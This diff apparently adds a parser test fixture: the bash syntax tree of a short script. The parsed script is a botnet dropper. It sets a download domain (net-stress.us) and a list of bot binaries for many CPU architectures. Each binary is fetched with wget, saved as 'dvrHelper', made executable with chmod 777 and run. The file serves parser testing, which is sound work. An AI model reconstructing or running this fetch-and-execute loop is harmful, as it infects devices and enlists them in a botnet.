@@ -1,0 +1,41 @@
+CommandNode(lineno=3, pos=(13, 35), parts=[
+  AssignmentNode(lineno=3, pos=(13, 35), word='DOMAIN=net-stress.us'),
+])
+CommandNode(lineno=4, pos=(36, 131), parts=[
+  AssignmentNode(lineno=4, pos=(36, 131), word='BINARYS=bot.arm bot.arm5n bot.arm7 bot.m68k bot.mips bot.mpsl bot.ppc bot.sh4 bot.spc bot.x86'),
+])
+CompoundNode(lineno=10, list=[
+  ForNode(lineno=10, pos=(133, 243), parts=[
+    ReservedwordNode(lineno=6, pos=(133, 136), word='for'),
+    WordNode(lineno=6, pos=(137, 141), word='bins'),
+    ReservedwordNode(lineno=6, pos=(142, 144), word='in'),
+    WordNode(lineno=6, pos=(145, 153), word='$BINARYS', parts=[
+      ParameterNode(lineno=6, pos=(145, 153), value='BINARYS'),
+    ]),
+    ReservedwordNode(lineno=6, pos=(153, 154), word=';'),
+    ReservedwordNode(lineno=6, pos=(155, 157), word='do'),
+    ListNode(lineno=10, pos=(159, 239), parts=[
+        CommandNode(lineno=7, pos=(159, 202), parts=[
+          WordNode(lineno=7, pos=(159, 163), word='wget'),
+          WordNode(lineno=7, pos=(164, 189), word='http://$domain/bins/$bins', parts=[
+            ParameterNode(lineno=7, pos=(171, 178), value='domain'),
+            ParameterNode(lineno=7, pos=(184, 189), value='bins'),
+          ]),
+          WordNode(lineno=7, pos=(190, 192), word='-O'),
+          WordNode(lineno=7, pos=(193, 202), word='dvrHelper'),
+        ]),
+        OperatorNode(lineno=7, op=';', pos=(202, 203)),
+        CommandNode(lineno=8, pos=(205, 224), parts=[
+          WordNode(lineno=8, pos=(205, 210), word='chmod'),
+          WordNode(lineno=8, pos=(211, 214), word='777'),
+          WordNode(lineno=8, pos=(215, 224), word='dvrHelper'),
+        ]),
+        OperatorNode(lineno=8, op=';', pos=(224, 225)),
+        CommandNode(lineno=9, pos=(227, 238), parts=[
+          WordNode(lineno=9, pos=(227, 238), word='./dvrHelper'),
+        ]),
+        OperatorNode(lineno=10, op='\n', pos=(238, 239)),
+      ]),
+    ReservedwordNode(lineno=10, pos=(239, 243), word='done'),
+  ]),
+], pos=(133, 243))
